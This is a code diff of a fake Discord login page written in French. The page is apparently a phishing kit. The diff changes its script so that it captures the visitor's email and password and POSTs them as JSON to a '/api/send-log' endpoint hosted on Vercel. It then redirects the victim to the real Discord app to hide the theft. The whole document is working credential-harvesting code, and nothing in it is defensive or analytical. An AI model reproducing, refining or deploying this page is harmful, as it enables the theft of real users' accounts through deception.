@@ -16,7 +16,7 @@
         <h2>Ha, te revoilà !</h2>
         <p>Nous sommes si heureux de te revoir !</p>
         
-        <form action="/api/send-log method="POST" id="loginForm">
+        <form id="loginForm">
             <label for="email">E-MAIL OU NUMÉRO DE TÉLÉPHONE *</label>
             <input type="text" id="email" name="email" required>
             
@@ -25,7 +25,7 @@
             
             <a href="#" class="forgot-password">Tu as oublié ton mot de passe ?</a>
             
-            <button onclick="window.location.href='https://discord.com/channels/@me'" type="submit">Connexion</button>
+            <button type="submit">Connexion</button>
         </form>
         
         <p>Besoin d'un compte ? <a href="#">S'inscrire</a></p>
@@ -33,29 +33,31 @@
 
     <script>
         document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Empêche l'envoi classique du formulaire
+            event.preventDefault(); // Empêche le rechargement de la page
             
             let email = document.getElementById("email").value;
             let password = document.getElementById("password").value;
             
-            // Envoie les données à ton serveur Node.js via fetch
-            fetch("/send-log", {
+            // Envoi des données à l'API sur Vercel
+            fetch("/api/send-log", {
                 method: "POST",
                 headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
+                    "Content-Type": "application/json"
                 },
-                body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password)
+                body: JSON.stringify({ email: email, password: password })
             })
-            .then(response => response.text())
+            .then(response => response.json())
             .then(data => {
-                console.log(data); // Affiche la réponse du serveur dans la console
+                console.log(data); // Vérifie la réponse dans la console
                 alert("Log envoyé avec succès !");
+                window.location.href = "https://discord.com/channels/@me"; // Redirection après succès
             })
             .catch(error => {
-                console.error(error);
+                console.error("Erreur :", error);
                 alert("Une erreur est survenue lors de l'envoi des logs.");
             });
         });
     </script>
 </body>
 </html>
+
